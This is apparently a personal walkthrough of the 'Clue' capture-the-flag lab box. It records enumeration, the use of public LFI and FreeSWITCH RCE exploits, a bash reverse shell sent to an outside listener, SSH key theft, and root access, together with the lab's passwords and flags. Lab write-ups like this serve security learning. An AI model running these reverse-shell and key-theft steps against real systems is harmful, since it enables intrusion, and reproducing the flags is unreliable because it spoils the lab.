# Clue

## Enumeration & scanning

- Find open ports 80, 139/445, 3000, 8021.

``` sh
# Standard enumeration and scanning
sudo nmap -sV -p- 192.168.129.240
sudo nmap -p 22,80,139,445,3000,8021 -A 192.168.129.240
nuclei -target 192.168.129.240   
feroxbuster --url http://192.168.177.240/
feroxbuster --url http://192.168.177.240:3000/  
```

### 80 (Apache httpd 2.4.38)

- Get `forbidden 403` when accessing. Feroxbuster finds `/backup` folder but can't access.

### 139/445 (SMB)

- Can access `/backup` SMB share on port 445 as anonymous.
- Contains what seems like backup folders for Freeswitch and Cassandra.
- Can't upload files.
- Files seem standard, Freeswitch passwords are default. Files likely not actually in use by live apps. Password should be in `/etc/freeswitch/autoload_configs/event_socket.conf.xml` but password doesn't work (see section on Freeswitch).

``` sh
# SMB specific scanning
sudo nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode 192.168.177.240
smbmap -H 192.168.177.240  
sudo nmap -p 139,445 --script="vuln" 192.168.217.240   
enum4linux -a 192.168.129.240 -p 445
# Download all /backup SMB share files (anonymous) and search them
smbclient //192.168.129.240/backup -N
mask ""
recurse ON
prompt OFF
mget *
grep -r "TERM" .
# Check event socket password
get /etc/freeswitch/autoload_configs/event_socket.conf.xml
# Check version of Freeswitch
zgrep "." changelog.gz | head -n 10
```

### 3000 (Apache Cassandra Web NoSQL)

- Shows some web GUI to browse Cassandra DB. Version is not clear.
- Seems to be this tool: https://github.com/avalanche123/cassandra-web. Only has one release it seems.
- There exists an LFI exploit for version 0.5: https://www.exploit-db.com/exploits/49362. Exploit works (realized this after exploring Freeswitch and `/backup` share).
- Get password, it is `StrongClueConEight021`.

``` sh
# Run exploit to get Freeswitch password
python3 49362.py 192.168.177.240 -p 3000 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```

### 8021 (FreeSWITCH mod_event_socket)

- Can connect via Netcat.
- Quickly learn that some CTFs work by using default password via nc (`ClueCon`) after which you have RCE. Doesn't work.


``` sh
# Connect via Netcat and authenticate (default password)
nc 192.168.217.240 8021
auth ClueCon
```


## Exploitation

- When password found via Cassandra Web, managed to authenticate.
- Use exploit found online for more ease of use.
- Get local flag.

``` sh
# Correct password and RCE
auth StrongClueConEight021
api system whoami
# Using exploit to get local flag
python3 47799.py 192.168.177.240 'cat /var/lib/freeswitch/local.txt'
1d89b5eebd26d0b026fe542752c9d2af
```


## Privilege Escalation

- Find password for `cassie` user in Cassandra DB via listing processes (`SecondBiteTheApple330`). Is also used for `cassie` OS user.
- Having very hard time getting reverse shell to work, commands and msfvenom payload both don't work. The shell is being run (`ps aux`) but no reverse shell is caught by Netcat.
- Manage to get it to work with doing it over port 80. Running it from `cassie` user by passing password in command.
- See other home directory for user `anthony` but can't access.
- Find `id_rsa` key in home directory of `cassie`.
- Use `id_rsa` key to authenticate as `root` to find flag.

``` sh
# Listing processes and find password of cassie DB user
python3 47799.py 192.168.135.240 'ps aux | cat'
# Get reverse shell from cassie user by running as her and upgrade
python3 47799.py 192.168.135.240 'echo "SecondBiteTheApple330" | su - cassie -c "/bin/sh -i >& /dev/tcp/192.168.45.164/80 0>&1"'
nc -nlvp 80
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Get ssh key
cat /home/cassie/id_rsa
# Authenticate as root
chmod 600 id_rsa_clue
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' root@192.168.120.240 -i id_rsa_clue
cat proof_youtriedharder.txt
62cd2c02f0a92d1e1799ac34b77f1770
```


## References

- https://github.com/avalanche123/cassandra-web
- https://www.exploit-db.com/exploits/49362 
- https://www.exploit-db.com/exploits/47799
- https://angelica.gitbook.io/hacktricks/network-services-pentesting/cassandra
- https://x7331.gitbook.io/boxes/services/tcp/8021-freeswitch

## Walkthrough learnings

- Metasploit freeswitch exploit would have been more convenient, reverse shell should have worked immediately.
- Run Cassandra Web again but as `sudo` since it's listed as exception for `cassie`, and then exploit again locally. Could then get files of Anthony.
- Check SSH config file to see who can authenticate via SSH and other settings.

``` sh
# Check SSH config
cat /etc/ssh/sshd_config

# Run Cassandra Web as root and exploit locally
sudo -l
sudo cassandra-web -u cassie -p SecondBiteTheApple330 -B 444
curl localhost:444/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is

# Misc.
# Quickly scan files for content
find . -type f -name "*.xml" -exec grep -nH password {} + | wc -l
# Look for cmdline processes
cat /proc/self/cmdline 
```

## Rabbit holes

### Cassandra

- Tried to get info from Cassandra Web. Got version of Cassandra DB (3.11.13) but thought it was of Cassandra Web.
- Tried various queries, didn't yield results.

``` sh
# Tried Cassandra queries
LIST USER
LIST ALL OF cassie;
LIST ROLES;
```

### Freeswitch

- Tried brute forcing password via Netcat with custom script.

### Exploitation

- Should have used Metasploit for more ease of use.
- Reverse shell should have had more focus to get to work. Lot of time spent on doing LFI via original exploit.
- Should have taken break earlier. `id_rsa` key was quick solution but didn't try on `root` somehow. 

### Privilege escalation

- The plan to run Cassandra Web again as root was right, but exploiting didn't work. Should have done locally via `curl`.
